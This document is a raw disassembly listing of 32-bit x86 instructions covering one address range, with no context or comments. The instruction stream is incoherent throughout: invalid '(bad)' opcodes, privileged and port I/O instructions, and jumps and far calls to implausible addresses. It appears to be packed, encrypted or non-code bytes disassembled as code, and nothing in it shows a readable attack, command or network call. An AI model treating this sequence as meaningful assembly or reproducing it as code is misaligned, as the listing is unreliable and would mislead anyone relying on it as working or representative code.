  403231:	aas    
  403232:	leave  
  403233:	mov    ch,0x95
  403235:	mov    cl,0xe0
  403237:	sub    eax,0x465531e9
  40323c:	sbb    al,0xc2
  40323e:	ins    DWORD PTR es:[edi],dx
  40323f:	pop    eax
  403240:	scas   al,BYTE PTR es:[edi]
  403241:	jns    0x403240
  403243:	mov    ebp,0x1f78e16a
  403248:	int    0x57
  40324a:	mov    ebp,0xc1a6a6b7
  40324f:	out    0xa3,eax
  403251:	fwait
  403252:	xlat   BYTE PTR ds:[ebx]
  403253:	add    DWORD PTR [esi],eax
  403255:	dec    esi
  403256:	pop    esp
  403257:	sbb    DWORD PTR [ebp-0x4123be72],edx
  40325d:	cmp    BYTE PTR [eax+0x49],0x7b
  403261:	xchg   ecx,eax
  403262:	das    
  403263:	pushf  
  403264:	(bad)  
  403265:	cld    
  403266:	jge    0x403261
  403268:	push   ebp
  403269:	mov    edi,DWORD PTR [esi]
  40326b:	sub    edx,DWORD PTR [ecx+0x790816ee]
  403271:	repnz aad 0x95
  403274:	sub    edi,eax
  403276:	and    al,0x7b
  403278:	pop    esi
  403279:	loopne 0x403289
  40327b:	fdiv   st(5),st
  40327d:	mov    esi,0x613edb65
  403282:	and    DWORD PTR [edi-0x63],edi
  403285:	test   eax,0x2587e042
  40328a:	xchg   BYTE PTR [ecx],dh
  40328c:	mov    al,ds:0xe755ce46
  403291:	sbb    ecx,DWORD PTR [edi+0x13]
  403294:	retf   0x693b
  403297:	(bad)  
  403298:	in     eax,0x1c
  40329a:	xchg   bl,dh
  40329c:	repz ret 0x97b7
  4032a0:	xor    al,0x42
  4032a2:	sub    edi,0xffffff8a
  4032a5:	str    WORD PTR [edx]
  4032a8:	fld    QWORD PTR [ebp-0x17]
  4032ab:	cmp    ebx,DWORD PTR [eax-0x49d6e775]
  4032b1:	outs   dx,BYTE PTR ds:[esi]
  4032b2:	out    dx,eax
  4032b3:	(bad)  
  4032b4:	stos   DWORD PTR es:[edi],eax
  4032b5:	xchg   DWORD PTR [edx+0x47f637c2],esp
  4032bb:	cld    
  4032bc:	and    bl,BYTE PTR [esi-0x5a]
  4032bf:	cmp    eax,DWORD PTR [edx-0x75b28f92]
  4032c5:	lods   al,BYTE PTR ds:[esi]
  4032c6:	xor    DWORD PTR [ecx+0xd454d28],esi
  4032cc:	cmp    BYTE PTR [eax-0x3d85c53f],cl
  4032d2:	xchg   edx,eax
  4032d3:	xchg   DWORD PTR [esi-0x45],ecx
  4032d6:	push   cs
  4032d7:	sub    DWORD PTR [esi+0x17],ebp
  4032da:	sub    BYTE PTR [edx+0x3d],cl
  4032dd:	mov    esp,0xbd9275ba
  4032e2:	aam    0x70
  4032e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032e5:	dec    edi
  4032e6:	iret   
  4032e7:	cld    
  4032e8:	sbb    al,0xfe
  4032ea:	lds    edi,FWORD PTR [edi+edx*4]
  4032ed:	and    dl,ch
  4032ef:	xchg   ebp,eax
  4032f0:	xor    eax,0xf70e2eb8
  4032f5:	arpl   WORD PTR [edi-0x98dab1f],dx
  4032fb:	aas    
  4032fc:	sbb    eax,0x24f0edea
  403301:	(bad)  [edx-0xebb1d23]
  403307:	dec    ebx
  403308:	out    0xc1,eax
  40330a:	out    dx,eax
  40330b:	push   ss
  40330c:	mov    edi,0x6ca1f685
  403311:	sbb    BYTE PTR [eax+ebx*1],al
  403314:	lods   al,BYTE PTR ds:[esi]
  403315:	(bad)  
  403316:	out    0x64,eax
  403318:	dec    edi
  403319:	ret    0x986d
  40331c:	xor    al,0x83
  40331e:	iret   
  40331f:	fwait
  403320:	cmc    
  403321:	xlat   BYTE PTR ds:[ebx]
  403322:	in     al,0xca
  403324:	mov    al,0x90
  403326:	jb     0x4032eb
  403328:	bound  ebp,QWORD PTR [esi]
  40332a:	sub    cl,BYTE PTR [ecx+0x7b]
  40332d:	xor    al,0x41
  40332f:	(bad)  
  403330:	and    eax,0x6c404fdb
  403335:	enter  0x5d08,0x11
  403339:	rcr    esp,1
  40333b:	cmp    esp,DWORD PTR [eax-0x7ab141af]
  403341:	lods   eax,DWORD PTR ds:[esi]
  403342:	clc    
  403343:	mov    WORD PTR [ebx-0x656963ea],?
  403349:	push   cs
  40334a:	adc    dh,dl
  40334c:	mov    al,0x9d
  40334e:	stos   BYTE PTR es:[edi],al
  40334f:	outs   dx,DWORD PTR ds:[esi]
  403350:	pop    edx
  403351:	xchg   BYTE PTR [edi-0x4f],cl
  403354:	lds    ebp,FWORD PTR [edi+eax*2-0x259af444]
  40335b:	lods   eax,DWORD PTR ds:[esi]
  40335c:	sub    eax,0xda13e1d6
  403361:	push   ss
  403362:	or     eax,0x6aa620b9
  403367:	lea    esi,[ebp-0x47]
  40336a:	xor    ebx,DWORD PTR [esi]
  40336c:	mov    edi,0x24afbfc7
  403371:	push   ecx
  403372:	pop    edi
  403373:	scas   al,BYTE PTR es:[edi]
  403374:	ins    DWORD PTR es:[edi],dx
  403375:	hlt    
  403376:	repz leave 
  403378:	cmp    DWORD PTR [ebx],ebp
  40337a:	int    0xaa
  40337c:	xor    DWORD PTR [esi+0xe05ad9],ebx
  403382:	ss js  0x4033fc
  403385:	packuswb mm3,QWORD PTR [eax+0x6ed99c6e]
  40338c:	outs   dx,BYTE PTR ds:[esi]
  40338d:	and    al,0xe5
  40338f:	sub    DWORD PTR [eax],eax
  403391:	outs   dx,BYTE PTR ds:[esi]
  403392:	aaa    
  403393:	mov    al,ds:0xc4832f0b
  403398:	ss cmc 
  40339a:	ja     0x403357
  40339c:	xchg   DWORD PTR [ecx-0x55],edi
  40339f:	repnz pop esi
  4033a1:	xlat   BYTE PTR ds:[ebx]
  4033a2:	xchg   esi,eax
  4033a3:	xor    al,0x82
  4033a5:	(bad)  
  4033a6:	mov    ecx,0x9a5d96d4
  4033ab:	fsubr  QWORD PTR [ecx*4+0x697aa4ec]
  4033b2:	outs   dx,DWORD PTR ds:[esi]
  4033b3:	fistp  DWORD PTR [esi-0x39]
  4033b6:	add    DWORD PTR [ecx+0x665106ea],esp
  4033bc:	or     BYTE PTR ds:0x1e6f1b68,al
  4033c2:	jnp    0x403423
  4033c4:	mov    esp,0x170703c4
  4033c9:	rol    BYTE PTR ds:0xe0b795b0,0x4b
  4033d0:	lock mov di,0x249
  4033d5:	cld    
  4033d6:	xchg   ecx,eax
  4033d7:	shl    DWORD PTR [edi],0x55
  4033da:	jle    0x4033b3
  4033dc:	jl     0x4033fd
  4033de:	sub    DWORD PTR [esi],0xa1794884
  4033e4:	or     eax,0xc26eccd8
  4033e9:	mov    ebx,0x1b95f0d9
  4033ee:	xchg   edx,eax
  4033ef:	mov    esp,0x554954b3
  4033f4:	xchg   DWORD PTR [esi-0x6fcaf2ba],esp
  4033fa:	jne    0x403389
  4033fc:	fs ja  0x4033dd
  4033ff:	push   esi
  403400:	or     edx,DWORD PTR ds:0x3d6efb66
  403406:	imul   edx,DWORD PTR [ecx-0xbc59ac5],0x1
  40340d:	jb     0x4033ba
  40340f:	mov    WORD PTR [ebx-0x3c9fc06d],gs
  403415:	pop    ds
  403416:	inc    edi
  403417:	xor    DWORD PTR [edi-0x3bbfc083],ebx
  40341d:	fdivr  DWORD PTR [ecx+0x4e]
  403420:	and    DWORD PTR [edx-0x55116749],ecx
  403426:	(bad)  
  403427:	sub    ch,BYTE PTR [ecx-0x3c]
  40342a:	jge    0x403422
  40342c:	xor    eax,0x2c549353
  403431:	or     eax,0x77a7804e
  403436:	push   esi
  403437:	xchg   esp,esp
  403439:	sbb    dh,BYTE PTR ds:0x76a67fcd
  40343f:	ja     0x4034ad
  403441:	stos   DWORD PTR es:[edi],eax
  403442:	mul    DWORD PTR [ebx+0x4aa94c32]
  403448:	and    DWORD PTR [ecx+0x40],esp
  40344b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40344c:	ror    DWORD PTR [esi],cl
  40344e:	loopne 0x403433
  403450:	fidiv  DWORD PTR [ecx]
  403452:	mov    esi,0x31677b00
  403457:	xlat   BYTE PTR ds:[ebx]
  403458:	pop    ecx
  403459:	mov    ecx,0xac642a78
  40345e:	clc    
  40345f:	(bad)  
  403460:	mov    al,0x63
  403462:	or     BYTE PTR [edi-0x6d75c4ec],dl
  403468:	and    bh,BYTE PTR [eax+0x2df16db2]
  40346e:	jge    0x40348e
  403470:	mov    ebp,0x17109be5
  403475:	lock jnp 0x403421
  403478:	dec    ecx
  403479:	cmp    ch,BYTE PTR ds:0xba286846
  40347f:	inc    ebp
  403480:	sbb    edi,edx
  403482:	fdiv   st(7),st
  403484:	mov    esp,?
  403486:	stos   BYTE PTR es:[edi],al
  403487:	div    BYTE PTR [esi]
  403489:	xor    ch,BYTE PTR [edi-0x498fe3ee]
  40348f:	cmp    DWORD PTR [edi*1+0x20e07b8c],0xfffffffe
  403497:	cwde   
  403498:	sbb    ah,dh
  40349a:	cmp    cl,BYTE PTR [edx]
  40349c:	imul   esi,DWORD PTR [ebp+0x53],0x2ca81306
  4034a3:	test   eax,0xf14aaa58
  4034a8:	jmp    0x8b6a0725
  4034ad:	jecxz  0x403500
  4034af:	mov    edi,0x270ca3fb
  4034b4:	push   esp
  4034b5:	or     edx,DWORD PTR [edi]
  4034b7:	int3   
  4034b8:	ror    al,cl
  4034ba:	es pop eax
  4034bc:	jl     0x40350f
  4034be:	cmc    
  4034bf:	clc    
  4034c0:	cwde   
  4034c1:	popf   
  4034c2:	inc    edx
  4034c3:	addr16 leave 
  4034c5:	lahf   
  4034c6:	or     BYTE PTR [edi],0xcd
  4034c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ca:	cmc    
  4034cb:	ins    BYTE PTR es:[edi],dx
  4034cc:	in     eax,dx
  4034cd:	add    al,0x8b
  4034cf:	push   eax
  4034d0:	stos   BYTE PTR es:[edi],al
  4034d1:	mov    bl,0xc0
  4034d3:	fdiv   QWORD PTR [ebx-0x65]
  4034d6:	sub    al,0x89
  4034d8:	mov    edx,0x4d308858
  4034dd:	fisttp DWORD PTR [ecx]
  4034df:	mov    gs,eax
  4034e1:	adc    cl,dh
  4034e3:	pop    es
  4034e4:	lds    esi,FWORD PTR [ebp-0x21a7a6ca]
  4034ea:	outs   dx,DWORD PTR ds:[esi]
  4034eb:	mov    esp,0x77986242
  4034f0:	and    BYTE PTR [eax+0x2c7ed97],dh
  4034f6:	cld    
  4034f7:	icebp  
  4034f8:	push   esi
  4034f9:	data16 and al,0xab
  4034fc:	inc    ebx
  4034fd:	cmc    
  4034fe:	ror    eax,cl
  403500:	je     0x4034cf
  403502:	in     al,dx
  403503:	inc    ebx
  403504:	imul   ecx,edi,0x80400f9f
  40350a:	stos   BYTE PTR es:[edi],al
  40350b:	repnz xchg ebx,eax
  40350d:	(bad)  
  40350e:	fisubr WORD PTR [edi-0x43]
  403511:	lods   eax,DWORD PTR ds:[esi]
  403512:	ret    0xe1
  403515:	cmp    DWORD PTR [esi],esp
  403517:	and    eax,esp
  403519:	std    
  40351a:	call   0x2cfe75ea
  40351f:	push   esp
  403520:	jae    0x4034d7
  403522:	xor    DWORD PTR [ebx+0x57],esp
  403525:	clc    
  403526:	popa   
  403527:	les    esi,FWORD PTR [ecx-0x3661129f]
  40352d:	or     eax,0x2daf43cf
  403532:	cmp    BYTE PTR [edi+0x3f],bh
  403535:	xlat   BYTE PTR ds:[ebx]
  403536:	mov    fs,WORD PTR [ebx]
  403538:	mov    bl,0x4
  40353a:	nop
  40353b:	loop   0x40359b
  40353d:	mov    cl,0x1a
  40353f:	pop    ebp
  403540:	pop    esi
  403541:	ins    BYTE PTR es:[edi],dx
  403542:	inc    edi
  403543:	mov    eax,ds:0xef3a5c85
  403548:	mov    ebp,0xb7354d42
  40354d:	cmp    esi,DWORD PTR [edi-0x103604f5]
  403553:	retf   
  403554:	fdivr  DWORD PTR ds:0xd9f0c00f
  40355a:	pusha  
  40355b:	cs mov al,0x22
  40355e:	stos   BYTE PTR es:[edi],al
  40355f:	fcom   QWORD PTR [esi+ebp*2+0x74]
  403563:	and    DWORD PTR [ecx],eax
  403565:	xor    edi,DWORD PTR [edx+0x8dfd341]
  40356b:	sar    BYTE PTR [ebx-0x2cc038bc],1
  403571:	cs xor eax,0xa8a75406
  403577:	out    0x90,eax
  403579:	dec    ebp
  40357a:	adc    BYTE PTR [ecx+esi*2+0xa],ch
  40357e:	sbb    BYTE PTR [edi-0x539fbd54],cl
  403584:	jno    0x40354b
  403586:	push   ds
  403587:	test   eax,0xcbd3b8eb
  40358c:	data16 xchg BYTE PTR [eax+edx*2],bl
  403590:	hlt    
  403591:	addr16 mov eax,ds:0xf3d6
  403595:	mov    DWORD PTR [eax],eax
  403597:	lds    esi,FWORD PTR [ebx]
  403599:	mov    ds:0x5d498165,al
  40359e:	cwde   
  40359f:	js     0x40354f
  4035a1:	mov    ds:0x445a2bbc,al
  4035a6:	jmp    0x4035da
  4035a8:	xlat   BYTE PTR ds:[ebx]
  4035a9:	mov    ebp,0x114de7ad
  4035ae:	pop    es
  4035af:	je     0x40357d
  4035b1:	cmp    DWORD PTR ds:0x7411077c,0x52
  4035b8:	cmp    DWORD PTR [esi-0x4d2c6664],esp
  4035be:	dec    edi
  4035bf:	xchg   BYTE PTR [edx-0x5a],bl
  4035c2:	sbb    ch,BYTE PTR [edx+0x58e91860]
  4035c8:	aam    0x46
  4035ca:	(bad)  ds:0x52e79a1d
  4035d0:	frstor [eax+0x40da2e02]
  4035d6:	sub    BYTE PTR ds:0x8e0e5d20,dh
  4035dc:	pop    ds
  4035dd:	retf   0x26de
  4035e0:	lock or al,bh
  4035e3:	call   0x8cf5:0x4ce9de84
  4035ea:	enter  0x8284,0x19
  4035ee:	ja     0x4035b5
  4035f0:	pop    ebp
  4035f1:	jge    0x403642
  4035f3:	jbe    0x40359d
  4035f5:	mov    eax,ds:0x3f2f774c
  4035fa:	xor    cl,BYTE PTR [edi-0x6c]
  4035fd:	leave  
  4035fe:	test   eax,0x766ae605
  403603:	mov    al,0x24
  403605:	jmp    0x3b8db9eb
  40360a:	popf   
  40360b:	mov    edx,0x9715c3be
  403610:	push   edx
  403611:	pop    ss
  403612:	mov    BYTE PTR [edi-0xe],dl
  403615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403616:	inc    edi
  403617:	and    al,BYTE PTR [eax]
  403619:	fucomi st,st(7)
  40361b:	jb     0x40361e
  40361d:	mov    bh,0xf7
  40361f:	dec    edi
  403620:	in     eax,dx
  403621:	aad    0xcc
  403623:	nop
  403624:	mov    eax,ds:0x9f57f33
  403629:	les    ecx,FWORD PTR [esi+ebx*2]
  40362c:	stos   DWORD PTR es:[edi],eax
  40362d:	stos   BYTE PTR es:[edi],al
  40362e:	inc    esi
  40362f:	fs pop eax
  403631:	rcr    DWORD PTR [edi+0x48ba3dc4],cl
  403637:	push   ss
  403638:	sub    al,0x53
  40363a:	inc    edx
  40363b:	loop   0x403617
  40363d:	adc    eax,0xfb883a00
  403642:	out    dx,al
  403643:	inc    ebx
  403644:	jmp    0x403695
  403646:	data16 adc bl,BYTE PTR [ecx-0x42544d8f]
  40364d:	iret   
  40364e:	out    dx,eax
  40364f:	cs jle 0x403688
  403652:	hlt    
  403653:	mov    es,esp
  403655:	test   al,0x32
  403657:	or     BYTE PTR [edi],ah
  403659:	xchg   edi,eax
  40365a:	inc    edx
  40365b:	shr    DWORD PTR [edi+0x29],1
  40365e:	mov    eax,ds:0xd498911e
  403663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403664:	arpl   WORD PTR [esi+eax*1],sp
  403667:	adc    ecx,DWORD PTR [ebp-0x48646f26]
  40366d:	mov    al,ds:0xa299993
  403672:	aaa    
  403673:	add    edi,DWORD PTR [edx+0x2c494f04]
  403679:	imul   esi,DWORD PTR [edx-0x9],0x67
  40367d:	das    
  40367e:	adc    eax,0x15d3f315
  403683:	pop    edx
  403685:	xchg   esp,eax
  403686:	jmp    0xaefce6b3
  40368b:	(bad)  
  40368c:	iret   
  40368d:	and    ebp,esi
  40368f:	aaa    
  403690:	std    
  403691:	clc    
  403692:	pushf  
  403693:	ss jmp 0x5d98:0x315a8979
  40369b:	(bad)  
  40369c:	adc    eax,0xf8f49937
  4036a1:	inc    edx
  4036a2:	addr16 add eax,0x77cb3c1f
  4036a8:	pop    esi
  4036a9:	out    dx,al
  4036aa:	or     eax,0xb73a27ba
  4036af:	sub    al,0x5c
  4036b1:	push   gs
  4036b3:	aad    0x4b
  4036b5:	xchg   esp,eax
  4036b6:	bound  ecx,QWORD PTR ds:0x4c8f84fa
  4036bc:	aaa    
  4036bd:	jnp    0x403662
  4036bf:	in     eax,dx
  4036c0:	xor    al,0x50
  4036c2:	xchg   ebx,eax
  4036c3:	fadd   DWORD PTR ds:0x7c240d19
  4036c9:	or     eax,DWORD PTR [eax+0x75]
  4036cc:	(bad)  
  4036cd:	into   
  4036ce:	push   esi
  4036cf:	out    0x3,al
  4036d1:	mov    ebx,0x298cfd8e
  4036d6:	sahf   
  4036d7:	mov    esp,0xb2257304
  4036dc:	jne    0x4036fc
  4036de:	push   ss
  4036df:	std    
  4036e0:	xchg   ebx,eax
  4036e1:	xchg   ebx,eax
  4036e2:	test   eax,0x77300183
  4036e7:	jle    0x4036cb
  4036e9:	test   eax,0xfb7e0a3
  4036ee:	mov    dh,al
  4036f0:	fnsave [esi-0xf]
  4036f3:	(bad)  
  4036f4:	in     eax,dx
  4036f5:	popa   
  4036f6:	adc    DWORD PTR [ecx+0x15765ebb],ebx
  4036fc:	mov    ah,0xb1
  4036fe:	pop    ds
  4036ff:	add    cl,BYTE PTR ds:0x838ea91e
  403705:	dec    esp
  403706:	mov    al,0x69
  403708:	dec    eax
  403709:	and    ax,0xd180
  40370d:	pop    edx
  40370e:	sbb    eax,0xc552086d
  403713:	xchg   esi,eax
  403714:	sbb    dl,BYTE PTR [ebx]
  403716:	dec    edi
  403717:	outs   dx,DWORD PTR ds:[esi]
  403718:	ins    DWORD PTR es:[edi],dx
  403719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40371a:	push   0x8e14271b
  40371f:	(bad)  
  403720:	lock jno 0x403790
  403723:	jecxz  0x4036d2
  403725:	sbb    edi,DWORD PTR [esi-0x6f1477af]
  40372b:	jnp    0x403708
  40372d:	push   ebp
  40372e:	call   0x6d5:0xbce10dc4
  403735:	mov    eax,ds:0x89fdbae8
  40373a:	out    0x37,al
  40373c:	push   ebx
  40373d:	pusha  
  40373e:	pop    esi
  40373f:	cwde   
  403740:	(bad)  
  403742:	into   
  403743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403744:	adc    ah,BYTE PTR [ebp+edx*1+0x10ba6d7e]
  40374b:	ret    0xa0bb
  40374e:	push   ecx
  40374f:	ret    
  403750:	pushf  
  403751:	sbb    al,0x6b
  403753:	in     eax,dx
  403754:	aam    0xfa
  403756:	xchg   ebp,eax
  403757:	adc    al,BYTE PTR [edx+0x4f]
  40375a:	cwde   
  40375b:	bound  edi,QWORD PTR [ebx-0x6b8436ab]
  403761:	mov    esp,0xa0388933
  403766:	sub    eax,0xde37624f
  40376b:	repz adc BYTE PTR [esp+eax*4-0x4ae0745e],dl
  403773:	jge    0x4037cb
  403775:	daa    
  403776:	jmp    0x88415d58
  40377b:	or     al,0x26
  40377d:	push   ss
  40377e:	jge    0x403741
  403780:	pop    ss
  403781:	inc    eax
  403782:	rcl    al,1
  403784:	sub    BYTE PTR [ebp+0x68],dl
  403787:	pop    edx
  403788:	das    
  403789:	push   ecx
  40378a:	sbb    eax,0xd788b15a
  40378f:	nop
  403790:	sbb    DWORD PTR [esi],0x76572e59
  403796:	inc    edx
  403797:	add    dh,al
  403799:	out    0x73,al
  40379b:	in     eax,dx
  40379c:	jmp    0x4037c8
  40379e:	inc    esp
  40379f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037a0:	dec    eax
  4037a1:	mov    bl,0xc5
  4037a3:	xor    eax,0xa94f1b6b
  4037a8:	ds mov dl,0xbd
  4037ab:	sub    DWORD PTR [ecx-0x75a1df63],esi
  4037b1:	pop    es
  4037b2:	ret    
  4037b3:	ds xchg ecx,eax
  4037b5:	add    ah,BYTE PTR [ebp+0x76]
  4037b8:	adc    eax,0x9c48099d
  4037bd:	test   DWORD PTR [esp+ebx*1-0x13facc8b],edi
  4037c4:	fsubr  DWORD PTR [edx+ebx*8]
  4037c7:	mov    ebx,0xcd42f0e0
  4037cc:	adc    cl,BYTE PTR [edx+ebp*4]
  4037cf:	jecxz  0x40381b
  4037d1:	test   DWORD PTR [edx-0x68],eax
  4037d4:	xchg   ebx,eax
  4037d5:	jge    0x4037a8
  4037d7:	jns    0x4037b9
  4037d9:	dec    edx
  4037da:	sub    cl,BYTE PTR [ecx]
  4037dc:	xchg   esp,eax
  4037dd:	stc    
  4037de:	push   esp
  4037df:	xchg   esi,eax
  4037e0:	stos   DWORD PTR es:[edi],eax
  4037e1:	aaa    
  4037e2:	out    dx,al
  4037e3:	add    ebp,ebp
  4037e5:	pop    ss
  4037e6:	retf   0x529e
  4037e9:	sbb    al,0x31
  4037eb:	xchg   ecx,eax
  4037ec:	mov    bh,0x14
  4037ee:	cmp    eax,0xed934025
  4037f3:	inc    ebx
  4037f4:	outs   dx,BYTE PTR ds:[esi]
  4037f5:	mov    cs,WORD PTR [ebx]
  4037f7:	add    al,ah
  4037f9:	rol    DWORD PTR ds:[esi+edi*8-0x5b],0xd7
  4037ff:	int    0x99
  403801:	add    al,BYTE PTR [ebp+0x4f31f6e8]
  403807:	xor    ecx,DWORD PTR [edi+ebp*8+0x3c]
  40380b:	jno    0x403835
  40380d:	std    
  40380e:	aaa    
  40380f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403810:	add    edi,eax
  403812:	loopne 0x403874
  403814:	push   0xffffffbc
  403816:	dec    esp
  403817:	pop    esp
  403818:	cdq    
  403819:	xchg   edi,eax
  40381a:	cmp    al,0x67
  40381c:	retf   
  40381d:	dec    ebp
  40381e:	scas   eax,DWORD PTR es:[edi]
  40381f:	sbb    eax,0xd841544d
  403824:	test   eax,0xbf3b81d5
  403829:	adc    al,0x7a
  40382b:	mov    eax,0x8f9fb3b8
  403830:	jae    0x4037e6
  403832:	js     0x403855
  403834:	sbb    ebp,ecx
  403836:	lds    ebp,FWORD PTR [eax+0x8]
  403839:	rcr    BYTE PTR [ebx-0x1119548],1
  40383f:	out    dx,al
  403840:	dec    ebp
  403841:	mov    dh,0x25
  403843:	ds retf 0x69d5
  403847:	rcr    dl,1
  403849:	mov    BYTE PTR [esi+0x532436c2],ch
  40384f:	dec    edx
  403850:	pushf  
  403851:	test   al,0x23
  403853:	jo     0x4038a9
  403855:	pop    ecx
  403856:	lds    esp,FWORD PTR [ebx]
  403858:	call   0x20fd5799
  40385d:	(bad)  
  40385e:	jmp    0x40388d
  403860:	inc    edi
  403861:	sub    bh,BYTE PTR [ebx-0x241dd4f1]
  403867:	in     eax,0xff
  403869:	or     BYTE PTR ds:0xd1fc0cb6,al
  40386f:	cld    
  403870:	js     0x4038b1
  403872:	dec    esp
  403873:	or     esp,DWORD PTR [esi+0x4d0eb05b]
  403879:	pop    ss
  40387a:	lds    eax,FWORD PTR [eax]
  40387c:	push   0x56
  40387e:	in     al,0xff
  403880:	ret    
  403881:	ret    0xafdb
  403884:	cwde   
  403885:	add    eax,0x422bf8a0
  40388a:	call   0xb5d4:0x2a5038fc
  403891:	sbb    al,0xb6
  403893:	xchg   esp,eax
  403894:	mov    al,0x89
  403896:	hlt    
  403897:	lahf   
  403898:	imul   edx,eax,0xfffffffa
  40389b:	jmp    0x4038f3
  40389d:	push   ebx
  40389e:	repnz mov ds:0x61e7bc71,al
  4038a4:	cmp    DWORD PTR [esi],0x4c294a07
  4038aa:	vpaddb ymm2,ymm4,YMMWORD PTR [ebp-0x30]
  4038af:	in     al,dx
  4038b0:	jecxz  0x4038fe
  4038b2:	dec    esi
  4038b3:	mov    ebx,0x9d02a743
  4038b8:	shr    DWORD PTR [ebx-0x7be46d94],1
  4038be:	cmp    dl,BYTE PTR [edx-0x74]
  4038c1:	cmp    eax,0x1eae193d
  4038c6:	aad    0x70
  4038c8:	nop
  4038c9:	pop    es
  4038ca:	mov    bl,0x6a
  4038cc:	shl    BYTE PTR [edx-0x6],1
  4038cf:	xlat   BYTE PTR ds:[ebx]
  4038d0:	arpl   WORD PTR [eax+0x667dca27],ax
  4038d6:	jns    0x4038ea
  4038d8:	jmp    0x4038a6
  4038da:	vmfunc 
  4038dd:	fidivr WORD PTR [ebx]
  4038df:	lods   eax,DWORD PTR ds:[esi]
  4038e0:	shr    BYTE PTR [ebp+esi*8-0x13affca2],1
  4038e7:	jmp    0x4038db
  4038e9:	xchg   esp,eax
  4038ea:	pop    ss
  4038eb:	push   esi
  4038ec:	inc    ebp
  4038ed:	mov    ah,0x88
  4038ef:	push   0xffffff97
  4038f1:	imul   eax,DWORD PTR [edx],0xffffff80
  4038f4:	je     0x4038f3
  4038f6:	pop    ebp
  4038f7:	jl     0x403952
  4038f9:	out    0x82,al
  4038fb:	lods   al,BYTE PTR ds:[esi]
  4038fc:	pop    es
  4038fd:	int    0x64
  4038ff:	jg     0x403949
  403901:	mov    ebp,0xa497cdb3
  403906:	nop
  403907:	mov    dl,0xc4
  403909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40390a:	cwde   
  40390b:	lock mov dl,0xc5
  40390e:	sub    DWORD PTR ds:0xc8d6f361,esi
  403914:	repnz or esi,esp
  403917:	sbb    eax,0xd07d4117
  40391c:	sub    BYTE PTR [ebx-0x526035b2],dl
  403922:	sub    al,0x70
  403924:	jmp    0xaca:0x77106f6a
  40392b:	pop    eax
  40392c:	pusha  
  40392d:	cmp    BYTE PTR ds:0xa778100d,bh
  403933:	inc    BYTE PTR [ebx-0x1f]
  403936:	jge    0x4039a6
  403938:	xor    BYTE PTR [ebx],0x1d
  40393b:	in     al,dx
  40393c:	inc    ebx
  40393d:	icebp  
  40393e:	test   cl,0xd5
  403941:	clc    
  403942:	retf   0x10
  403945:	ins    BYTE PTR es:[edi],dx
  403946:	xchg   ebx,eax
  403947:	fsub   DWORD PTR [edi-0x7c1eb7a8]
  40394d:	inc    eax
  40394e:	and    al,0x1b
  403950:	js     0x403944
  403952:	adc    DWORD PTR [edi+esi*2],eax
  403955:	xchg   esp,eax
  403956:	pop    esp
  403957:	ins    DWORD PTR es:[edi],dx
  403958:	mov    ds:0x41315130,al
  40395d:	sub    DWORD PTR [edx-0x44],edi
  403960:	js     0x4039cd
  403962:	xor    DWORD PTR [edi],0x728c5bee
  403968:	jmp    0xb9a7ee2e
  40396d:	and    al,0xc2
  40396f:	cwde   
  403970:	jo     0x4039cf
  403972:	pop    ds
  403973:	jecxz  0x4039cf
  403975:	es fwait
  403977:	iret   
  403978:	or     bl,0xe8
  40397b:	mov    cl,0x89
  40397d:	ss (bad) 
  40397f:	hlt    
  403980:	stos   DWORD PTR es:[edi],eax
  403981:	or     bl,BYTE PTR [ebp+0x73a76267]
  403987:	mov    eax,ds:0xe12726c6
  40398c:	pushf  
  40398d:	pop    ss
  40398e:	push   ecx
  40398f:	neg    ecx
  403991:	fidiv  DWORD PTR [ecx-0x1d]
  403994:	pop    ss
  403995:	pusha  
  403996:	dec    eax
  403997:	jmp    0xf781:0xa10b3b24
  40399e:	hlt    
  40399f:	dec    edi
  4039a0:	jg     0x40393a
  4039a2:	rcr    dl,cl
  4039a4:	or     edi,DWORD PTR [eax-0x1b820072]
  4039aa:	imul   esi,DWORD PTR [eax-0x63],0x12
  4039ae:	and    edx,DWORD PTR [ebp+0x6db2cbf1]
  4039b4:	inc    ebx
  4039b5:	mov    edx,0x8ce8c3a2
  4039ba:	repz imul esp,DWORD PTR [eax],0x286a388d
  4039c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c2:	popf   
  4039c3:	or     BYTE PTR [ecx-0x3b],bh
  4039c6:	and    bl,bl
  4039c8:	cwde   
  4039c9:	fist   WORD PTR [esi-0x71]
  4039cc:	and    edx,DWORD PTR [ebx-0x6c72d25d]
  4039d2:	imul   esp,ebp,0x3cfb80f9
  4039d8:	sub    ebx,DWORD PTR [ebp+0x71703a8b]
  4039de:	sbb    DWORD PTR [esi-0x4f],esp
  4039e1:	jmp    0x850a8dee
  4039e6:	xor    DWORD PTR [ebp-0x47],0x859be218
  4039ed:	test   BYTE PTR [ecx],ch
  4039ef:	pop    ebx
  4039f0:	in     al,0x10
  4039f2:	fnstsw WORD PTR [ebx]
  4039f4:	(bad)  
  4039f5:	aad    0xad
  4039f7:	out    dx,eax
  4039f8:	loopne 0x403a50
  4039fa:	mov    ch,0x46
  4039fc:	test   ebp,ecx
  4039fe:	test   eax,0xc9d6f58
  403a03:	scas   al,BYTE PTR es:[edi]
  403a04:	mov    eax,0xf27dcd07
  403a09:	pop    eax
  403a0a:	pop    ebp
  403a0b:	jp     0x403a7a
  403a0d:	stos   BYTE PTR es:[edi],al
  403a0e:	jl     0x403a02
  403a10:	dec    esp
  403a11:	xlat   BYTE PTR ds:[ebx]
  403a12:	xor    dh,bl
  403a14:	xor    eax,0x827ff36e
  403a19:	hlt    
  403a1a:	loope  0x403a0c
  403a1c:	adc    bh,bl
  403a1e:	sbb    eax,0x18ee06be
  403a23:	xor    eax,eax
  403a25:	jmp    0xe35b:0x14271d19
  403a2c:	cld    
  403a2d:	mov    eax,0xdf3d0c08
  403a32:	xchg   esi,eax
  403a33:	mov    edx,0x269715c2
  403a38:	push   edx
  403a39:	aam    0x76
  403a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
